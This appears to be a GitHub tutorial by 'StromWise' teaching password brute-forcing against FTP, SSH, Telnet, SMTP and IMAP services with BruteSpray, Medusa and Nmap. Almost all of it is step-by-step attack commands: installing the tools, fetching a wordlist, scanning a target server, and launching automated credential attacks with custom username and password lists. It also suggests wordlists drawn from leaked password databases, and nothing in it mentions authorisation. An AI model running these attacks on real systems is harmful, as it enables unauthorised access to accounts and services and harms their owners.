# IN THIS TOTURIAL YOU WILL LEARN HOW TO BRUTEFORCE PASSWORD FOR NETWORK SERVICES (FTP, SSH, TELNET, SMTP, IMAP ).

## YOU CAN USE KALI LINUX OS FOR BEST RESULTS.


### Set Up BruteSpray & Medusa 

STEP 1: apt-get autoremove brutespray

STEP 2: git clone https://github.com/x90skysn3k/brutespray.git

STEP 3: cd brutespray/

STEP 4: pip install -r requirements.txt

STEP 5: apt-get install medusa

STEP 6: ./brutespray.py --help

STEP 7: apt-get install nmap

STEP 8: wget 'https://raw.githubusercontent.com/tokyoneon/1wordlist/master/1wordlist2rulethem%40ll.txt'

### The wordlist I'm using in this guide can be downloaded with the following command. You can, of course, use any wordlist that you want from leaked password databases , other wordlists online, or from custom wordlist-building tools such as Mentalist, CeWL, and Crunch.


## Generate Nmap Output Files

BruteSpray requires an Nmap output file to function. These files can be created using Nmap's -oX or -oG arguments as seen in the below Nmap command. The -sV means it will probe open ports to determine the service and version information.Usage of -oG is the most important argument here. It will save the Nmap output to a local file in grepable format. This allows BruteSpray to effectively process the services and ports found on the target server. Similarly, the -oX argument will save the Nmap output to an XML output, which is also supported by BruteSpray but less human-readable

STEP 1: nmap -sVTU -p ports TargetServer -oG filename.gnmap

Make sure to replace "ports" above with the ports you wan to scan, "TargetServer" with the IP address of your target, and "filename" with the name you want to give the file. Once done, the newly created .gnmap file can be viewed using the cat command.

STEP 2: cat filename.gnmap

STEP 3: cat tokyoneon.gnmap

Take note of the "open" ports discovered by Nmap as these services are now available for automated brute-force attacks.



## Automate Brute-Force Attacks with BruteSpray

STEP 1: ./brutespray.py --modules


### 1 Interactive Mode

The -i argument can be used to enable an interactive mode, a guided mode designed to maximize the ease of use.

STEP 2: ./brutespray.py --file filename.gnmap -i

STEP 3: Simply follow the prompts and the brute-force attack will begin.



### 2 Target Individual Services

Targeting a single service can be accomplished using the --service argument and specifying the protocol. If the --username argument isn't specified when using --service, BruteSpray will use the default username list found in the wordlist/ssh/user file. This list of usernames can be modified at any time.

STEP 1: ./brutespray.py --file filename.gnmap --service ssh



### Configure Custom Wordlists & Usernames (Optional)

There are small built-in wordlists and username lists that are automatically used when a particular service is brute-forced. For example, the "password" file, located in the wordlist/ssh/ directory, contains passwords used when brute-forcing SSH services. Each supported service has its own dedicated directory in the wordlist/ directory.

STEP 1: ls -F wordlist/

It would be possible to manually change the built-it wordlists using the below cp command to copy over a custom wordlist.

STEP 2: cp /path/to/customPasswords.list wordlist/ssh/password

Built-in username lists can also be changed using the below command.

STEP 3: cp /path/to/customUser.list wordlist/vnc/user

Alternatively, custom password and usernames lists can be used from command line with the --passlist and --username arguments.

STEP 4: ./brutespray.py --file filename.gnmap --username UsernameHere --passlist /path/to/desired/passwords.list --service ftp







____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________

